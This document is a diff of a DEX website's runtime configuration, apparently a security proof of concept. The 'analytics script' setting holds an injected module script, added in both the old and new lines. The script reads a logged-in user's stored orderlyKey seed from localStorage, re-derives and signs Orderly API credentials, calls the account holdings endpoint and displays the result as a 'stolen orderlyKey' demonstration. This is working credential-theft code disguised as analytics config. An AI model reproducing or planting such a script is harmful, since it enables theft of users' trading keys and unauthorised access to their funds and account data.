@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://dex.orderly.network/orderly-dex-6053/",
+  "VITE_SEO_SITE_URL": "https://poc.example",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script type=\"module\">\nimport bs58 from \"https://esm.sh/bs58@5\";\nimport * as ed from \"https://esm.sh/@noble/ed25519@2\";\nconst k = Object.keys(localStorage).find(x => x.startsWith(\"orderly_mainnet_0x\") && x !== \"orderly_mainnet_address\");\nif (!k) { alert(\"§24: log in to dex.orderly.network with a wallet first.\"); throw 0; }\nconst d = JSON.parse(localStorage[k]);\nconst seed = bs58.decode(d.orderlyKey);\nconst pub = await ed.getPublicKeyAsync(seed);\nconst oKey = \"ed25519:\" + bs58.encode(pub);\nconst ts = Date.now().toString();\nconst path = \"/v1/client/holding\";\nconst msg = ts + \"GET\" + path;\nconst sig = await ed.signAsync(new TextEncoder().encode(msg), seed);\nconst sigB64 = btoa(String.fromCharCode(...sig)).replace(/\\+/g, \"-\").replace(/\\//g, \"_\");\nconst r = await fetch(\"https://api.orderly.org\" + path, { headers: {\n  \"orderly-account-id\": d.accountId,\n  \"orderly-key\": oKey,\n  \"orderly-signature\": sigB64,\n  \"orderly-timestamp\": ts,\n}});\nconst j = await r.json();\nalert(\"§24 → in-scope api.orderly.org call succeeded with stolen orderlyKey\\r\\n\\r\\n\"+\"localStorage key on dex.orderly.network: \" + k + \"\norderly-account-id: \" + d.accountId + \"\norderly-key (header): \" + oKey + \"\n\nGET https://api.orderly.org/v1/client/holding response:\n\n\" + JSON.stringify(j, null, 2));\n</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script type=\"module\">import bs58 from \"https://esm.sh/bs58@5\";import * as ed from \"https://esm.sh/@noble/ed25519@2\";const k=Object.keys(localStorage).find(x=>x.startsWith(\"orderly_mainnet_0x\")&&x!==\"orderly_mainnet_address\");if(!k){alert(\"§24: log in to dex.orderly.network with a wallet first.\");throw 0;}const d=JSON.parse(localStorage[k]);const seed=bs58.decode(d.orderlyKey);const pub=await ed.getPublicKeyAsync(seed);const oKey=\"ed25519:\"+bs58.encode(pub);const ts=Date.now().toString();const path=\"/v1/client/holding\";const sig=await ed.signAsync(new TextEncoder().encode(ts+\"GET\"+path),seed);const sigB64=btoa(String.fromCharCode(...sig)).replace(/\\+/g,\"-\").replace(/\\//g,\"_\");const r=await fetch(\"https://api.orderly.org\"+path,{headers:{\"orderly-account-id\":d.accountId,\"orderly-key\":oKey,\"orderly-signature\":sigB64,\"orderly-timestamp\":ts}});const j=await r.json();alert(`§24 -> api.orderly.org call succeeded with stolen orderlyKey\n\nlocalStorage key on dex.orderly.network: ${k}\norderly-account-id: ${d.accountId}\norderly-key (header): ${oKey}\n\nGET https://api.orderly.org/v1/client/holding response:\n${JSON.stringify(j,null,2)}`);</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
